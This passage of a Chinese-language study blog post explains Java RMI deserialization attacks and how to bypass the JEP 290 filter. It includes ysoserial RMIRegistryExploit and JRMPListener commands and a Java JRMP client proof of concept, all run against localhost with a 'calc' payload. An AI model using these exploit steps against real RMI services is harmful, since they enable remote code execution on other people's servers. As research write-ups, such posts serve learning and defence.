    String hello(Object object) throws RemoteException;
}
```

接口实现类

```
package RMIunser;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class HelloImpl extends UnicastRemoteObject implements Hello {
    protected HelloImpl() throws RemoteException {
    }

    public String hello() throws RemoteException {
        return "hello world";
    }

    public String hello(String name) throws RemoteException {
        return "hello" + name;
    }

    public String hello(Object object) throws RemoteException {
        System.out.println(object);
        return "hello "+object.toString();
    }
}
```

服务端

```
package RMIunser;

import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class Server {
    public static String HOST = "127.0.0.1";
    public static int PORT = 1099;
    public static String RMI_PATH = "/hello";
    public static final String RMI_NAME = "rmi://" + HOST + ":" + PORT + RMI_PATH;

    public static void main(String[] args) {
        try {
            // 注册RMI端口
            LocateRegistry.createRegistry(PORT);
            // 创建一个服务
            Hello hello = new HelloImpl();
            // 服务命名绑定
            Naming.rebind(RMI_NAME, hello);

            System.out.println("启动RMI服务在" + RMI_NAME);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

用8u121以后的版本，客户端yso发包用CC6打一下打一下试试

```
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 1099 CommonsCollections calc
```

![image-20220412232221185](images/8.png)

返回了REJECTED被拦截了，这里虽然8u201用CC1是打不通的，但是报错可以看到是被拦截了

![image-20220412232329381](images/9.png)

从服务端也可以看到拦截了下来

但是当攻击客户端的时候，JEP290是不会起作用的

# JEP290 Bypass

既然是白名单，绕过方式可想而知，就是从白名单里面去寻找可以反序列化的Gadget

其实这里和JRMP服务端攻击客户端的方式有点像

之前是通过ysoserial起一个恶意的服务端

```
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 "calc"
```

然后通过payload/JRMPClient来生成payload，然后反序列化这个payload对服务端发起一个call连接，JRMP服务端返回恶意远程对象，DGC发起dirtyCall，直接反序列化恶意对象

![image-20220417120050192](images/10.png)

这里是不受JEP290的限制的，JEP290默认没有对JRMP客户端的反序列化做限制，所以能够打通

现在仍然起一个恶意的服务端

```
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 "calc"
```

yso中的JRMPClient相应代码：

```
ObjID id = new ObjID(new Random().nextInt()); // RMI registry
TCPEndpoint te = new TCPEndpoint(host, port);
UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] {
Registry.class
}, obj);
return proxy;
```

这里直接开一个客户端去连接

```
package ysoserial.JRMP;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;


public class Client {
    public static void main(String[] args) throws RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException {

        Registry reg = LocateRegistry.getRegistry("127.0.0.1",1099);
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint("127.0.0.1", 1099);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Registry proxy = (Registry) Proxy.newProxyInstance(Client.class.getClassLoader(), new Class[] {
            Registry.class
        }, obj);
        reg.bind("hello",proxy);

    }

}
```

直接进行一个RMI交互

![image-20220417140916375](images/11.png)

此时我的版本是8u201

但是这种方法在8u231以后就不行了，具体的分析网上都有https://paper.seebug.org/1251/#jep-290-jep290

另外在8u231以后有师傅找到了新的利用方法

https://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/



# 后言

这次对RMI再次研究其实也是他的用法，对一些更深层次的代码还是研究较少，总的来说还是因为RMI在通信的是序列化传输的，然后通过RMI的一些交互的函数，这些函数可以有readObject，然后进行反序列化，至于JRMP的反序列化，在ysoserial里面那个payload/JRMPListener反序列化后能够开启一个RMI监听，总的来说和RMI反序列化有点类似，也分为了对客户端或者服务端的攻击

但是JEP290的还是有点不清楚，目前只是了解了一下，这算是一个过滤器吧，但是不管如何，RMI反序列化中还是都需要对应的Gadgets



参考链接

https://xz.aliyun.com/t/9053#toc-5

https://su18.org/post/rmi-attack/#1-%E6%94%BB%E5%87%BB-server-%E7%AB%AF

http://www.yongsheng.site/2022/03/04/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/

https://paper.seebug.org/1251/#_8

https://paper.seebug.org/1689/

https://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/